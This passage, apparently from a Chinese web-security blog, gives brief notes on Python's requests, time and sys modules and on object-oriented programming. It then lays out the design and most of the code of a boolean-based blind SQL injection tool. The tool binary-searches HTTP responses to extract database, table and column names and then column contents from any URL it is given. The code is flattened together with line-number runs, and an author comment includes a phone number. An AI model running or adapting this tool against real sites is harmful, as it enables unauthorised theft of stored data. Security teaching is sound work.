requests.delete(“http://httpbin.org/delete”) # DELETE请求 requests.head(“http://httpbin.org/get”) # HEAD请求 requests.options(“http://httpbin.org/get” ) # OPTIONS请求 响应的内容 r.encoding #获取当前的编码 r.encoding = &#39;utf-8&#39; #设置编码 r.text #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。 r.content #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。 r.headers #以字典对象存储服务器响应头，字典键不区分大小写，若键不存在则返回None r.status_code #响应状态码 r.raw #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read() r.ok # 查看r.ok的布尔值便可以知道是否登陆成功 r.json() #Requests中内置的JSON解码器，以json形式返回 r.raise_for_status() #失败请求(非200响应)抛出异常 time 作用：可以用于格式化日期和时间，时间间隔是以秒为单位的浮点小数。 用法： import time #导入time模块 time.sleep(secs) #推迟调用线程的运行，secs指秒数。 time.time() #获取当前的系统的时间戳 sys 作用：sys模块提供对由解释器使用或维护的某些变量、与解释器交互的函数的访问接口。 用法： sys.argv #传递给python脚本的命令行参数列表。argv[0]表示脚本名称(是不是完成路径名取决于操作系统)。如果命令使用-c选项执行，argv[0]表示字符串-c。如果命令行没有指定脚本名称，argv[0]为空字符串。 sys.exit(n) #程序退出，如果是正常退出是sys.exit(0) sys.path #返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值 sys.stdout.write sys.stdout.flush #刷新缓冲区 4.1.2 面向对象面向对象编程——Object Oriented Programming，简称 OOP，是一种程序设计思想。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的函数。面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。 类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。 方法：类中定义的函数。 类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。 数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。 方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。 局部变量：定义在方法中的变量，只作用于当前实例的类。 实例变量：在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。 继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。 实例化：创建一个类的实例，类的具体对象。 对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。 三大特点：数据封装、继承、多态。 4.2 脚本开发4.2.1 功能逻辑设计思路 基于布尔型盲注脚本开发 主程序入口(boolbaseblind.py) optparse模块实现脚本参数化输入 对功能模块的调用 二分查找与网页请求(class Merge_serach) get_url_request 实现网页请求功能 merge_serach 实现二分查找遍历数值 猜解数据库库名(class GuessDatabase) get_all_db_Count 实现获取数据库库名数量 get_all_db_Length 实现获取所有库名的长度功能 def get_all_db_Name 实现获取所库名称功能 猜解数据库表名(class GuessTables) get_all_table_Count 实现获取指定库所有表名数量 get_all_table_Length 实现获取指定库所有表名的长度功能 get_all_table_Name 实现获取指定库所有表名称功能 猜解数据库字段名(class GuessColumns) get_all_column_Count 实现获取指定表中所有字段数量 get_all_column_Length 实现获取指定表中所有字段长度 get_all_column_Name 实现获取指定表中所有字段名 猜解数据库字段内容(class GuessClContent) get_all_cl_content_Count 实现获取指定字段中所有字段内容的数量 get_all_cl_content_Length 实现获取指定字段中所有字段内容的长度 get_all_cl_content_details 实现获取指定字段中所有字段内容 4.2.2 编码实现 主程序入口(boolbaseblind.py) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/local/env python3# -*- coding: UTF-8 -*-# Author: Mr.zhang# Tel:15888371774# Date:2020-2-28from guessdatabase import GuessDatabasefrom guesstables import GuessTablesfrom guesscolumns import GuessColumnsfrom guessclcontent import GuessClContentimport optparseimport timeimport sysparser=optparse.OptionParser()parser.add_option(\"-D\", \"--database\", action=\"store\",type=\"string\",dest=\"database\",help=\"Please input test databases\")parser.add_option(\"-T\", \"--table\",action=\"store\",type=\"string\",dest=\"table\",help=\"Please input test table\")parser.add_option(\"-C\", \"--column\",action=\"store\",type=\"string\",dest=\"column\",help=\"Please input test column\")parser.add_option(\"-U\",\"--url\", action=\"store\",type=\"string\",dest=\"url\",help=\"Please input test url\")(options,args) = parser.parse_args()def main(): if options.url == None and options.database == None and options.table == None and options.column == None: print(\"Please read the help\") parser.print_help() sys.exit() elif options.url != None and options.database ==None and options.table == None and options.column == None: start_time = time.time() guessdb = GuessDatabase(options.url) #创建获取guessdb对象 db_count = guessdb.get_all_db_Count() db_length_list = guessdb.get_all_db_Length(db_count) guessdb.get_all_db_Name(db_count, db_length_list) end_time = time.time() print('[+] INFO : \\033[1;35;0m猜解所有库名所用时间为 %d 秒 \\033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table == None and options.column == None: start_time = time.time() guesstb = GuessTables(options.url,options.database) #创建获取guesstb对象 tb_count = guesstb.get_all_table_Count() tb_length_list = guesstb.get_all_table_Length(tb_count) guesstb.get_all_table_Name(tb_count, tb_length_list) end_time = time.time() print('[+] INFO : \\033[1;35;0m猜解所有表名所用时间为 %d 秒 \\033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table != None and options.column == None: start_time = time.time() guesscl = GuessColumns(options.url,options.database,options.table) cl_count = guesscl.get_all_column_Count() cl_length_list = guesscl.get_all_column_Length(cl_count) guesscl.get_all_column_Name(cl_count, cl_length_list) end_time = time.time() print('[+] INFO : \\033[1;35;0m猜解所有字段名所用时间为 %d 秒 \\033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table != None and options.column != None: start_time = time.time() guessclcontent = GuessClContent(options.url,options.database,options.table,options.column) cl_content_count = guessclcontent.get_all_cl_content_Count() cl_content_length_list = guessclcontent.get_all_cl_content_Length(cl_content_count) guessclcontent.get_all_cl_content_details(cl_content_count, cl_content_length_list) end_time = time.time() print('[+] INFO : \\033[1;35;0m猜解所有字段内容所用时间为 %d 秒 \\033[0m' %int(end_time-start_time)) if __name__ == \"__main__\": main() 二分查找与网页请求(class Merge_serach) get_url_requests 实现网页请求功能 123456def get_url_request(self, final_payload): try: result = requests.get(url = final_payload, headers = self.headers, timeout = 3).text except TimeoutError as e: print(\"请求超时。。。\") return result merge_serach 实现二分查找遍历数值 123456789101112131415161718def merge_serach(self, url, payload): # 定义循环数据列表 range_list = [x for x in range(0,127)] min = 0 #代表列表下标的起始值 max = len(range_list) - 1 #代表列表下标的结束值 while True: mid = (max + min) // 2 #获取列表下标的中间值 #定义最终payload格式 final_payload = url + payload + ' &gt; &#123;&#125;--+'.format(mid) result = self.get_url_request(final_payload) if \"You are in\" in result: min = mid else: max = mid if min == max - 1: if \"You are in\" in result: return max return min+1 猜解数据库库名(class GuessDatabase) get_all_db_Count 实现获取数据库库名数量 1234def get_all_db_Count(self): db_count = self.merge_serach.merge_serach(self.url, self.db_count_payload) print('[+] INFO : 当前 mysql 中库的数量为: %d' %(db_count)) return db_count get_all_db_Length 实现获取所有库名的长度功能 12345678def get_all_db_Length(self, db_count): db_length_list = [] #循环获取所有表名的长度 for i in range(0,db_count): db_length = self.merge_serach.merge_serach(self.url, self.db_length_payload.format(i)) db_length_list.append(db_length) # print(\"[+] INFO : 库 %d 的长度是: %d\" % (i+1, db_length)) return db_length_list def get_all_db_Name 实现获取所库名称功能 12345678910def get_all_db_Name(self, db_count, db_length_list): for i in range(0, db_count): print('[+] INFO : 库 %d 的名称为: ' %(i+1), end = '') db_name = \"\" for j in range(1, db_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.db_name_payload.format(i, j))) db_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库表名(class GuessTables) get_all_table_Count 实现获取指定库所有表名数量 1234def get_all_table_Count(self): tb_count = self.merge_serach.merge_serach(self.url, self.tb_count_payload.format(self.db_name)) print('[+] INFO : 当前 %s 库中表的数量为: %d' %(self.db_name, tb_count)) return tb_count get_all_table_Length 实现获取指定库所有表名的长度功能 1234567def get_all_table_Length(self, tb_count): tb_length_list = [] for i in range(0, tb_count): tb_length = self.merge_serach.merge_serach(self.url, self.tb_length_payload.format(self.db_name, i)) tb_length_list.append(tb_length) # print(tb_length_list) return tb_length_list get_all_table_Name 实现获取指定库所有表名称功能 12345678910def get_all_table_Name(self, tb_count, tb_length_list): for i in range(0, tb_count): print('[+] INFO : 当前 %s 库中第 %d 个表的名称为:' %(self.db_name, i + 1), end = '') tb_name = \"\" for j in range(1, tb_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.tb_name_payload.format(self.db_name, i, j))) tb_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库字段名(class GuessColumns) get_all_column_Count 实现获取指定表中所有字段数量 1234def get_all_column_Count(self): cl_count = self.merge_serach.merge_serach(self.url, self.cl_count_payload.format(self.db_name, self.tb_name)) print('[+] INFO : 当前 %s 表中字段的数量为: %d' %(self.tb_name, cl_count)) return cl_count get_all_column_Length 实现获取指定表中所有字段长度 1234567def get_all_column_Length(self, cl_count): cl_length_list = [] for i in range(0, cl_count): cl_length = self.merge_serach.merge_serach(self.url, self.cl_length_payload.format(self.db_name, self.tb_name, i)) cl_length_list.append(cl_length) # print(cl_length_list) return cl_length_list get_all_column_Name 实现获取指定表中所有字段名 12345678910def get_all_column_Name(self, cl_count, cl_length_list): for i in range(0, cl_count): print('[+] INFO : 当前 %s 表中第 %d 个字段的名称为:' %(self.db_name, i + 1), end = '') cl_name = \"\" for j in range(1, cl_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_name_payload.format(self.db_name, self.tb_name, i, j))) cl_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库字段内容(class GuessClContent) get_all_cl_content_Count 实现获取指定字段中所有字段内容的数 12345def get_all_cl_content_Count(self): for i in range(0, len(self.cl_name_list)): cl_content_count = self.merge_serach.merge_serach(self.url, self.cl_content_count_payload.format(self.cl_name_list[i], self.db_tb_name)) print('[+] INFO : 当前 %s 字段中内容的数量为: %d' %(self.cl_name, cl_content_count)) return cl_content_count get_all_cl_content_Length 实现获取指定字段中所有字段内容的长度 1234567891011def get_all_cl_content_Length(self, cl_content_count): all_list = [] for j in range(0, len(self.cl_name_list)): cl_content_length_list = [] for i in range(0, cl_content_count): cl_content_length = self.merge_serach.merge_serach(self.url, self.cl_content_length_payload.format(self.cl_name_list[j], self.db_tb_name, i)) cl_content_length_list.append(cl_content_length) # print(cl_content_length_list) all_list.append(cl_content_length_list) # print(all_list) # print(self.db_tb get_all_cl_content_details 实现获取指定字段中所有字段内容 12345678910def get_all_cl_content_details(self, cl_content_count, all_list): for i in range(0, len(all_list)): print('[+] INFO : 字段 %s 的内容为: ' % self.cl_name_list[i],end = '') for j in range(0, len(all_list[i])): cl_content_details = \"\" for z in range(1, all_list[i][j] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_content_details_payload.format(self.cl_name_list[i], self.db_tb_name, j, z))) cl_content_details += curr_str print(' | %s | ' %cl_content_details, end = '') print('')","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.greetdawn.top/categories/Web安全/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.greetdawn.top/tags/SQL注入/"}]}]}